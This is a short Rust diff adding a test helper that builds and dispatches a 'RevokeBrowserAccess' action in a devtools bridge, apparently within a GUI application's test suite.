+fn run_revoke_browser_access(app: &mut Win, cx: &mut TestAppContext) {
+    let action = cx
+        .update(|cx| cx.build_action("devtools_bridge::RevokeBrowserAccess", None))
+        .expect("the action is registered under this name");
+    app.cx
+        .update(|window, cx| window.dispatch_action(action, cx));
+    app.cx.run_until_parked();
+}
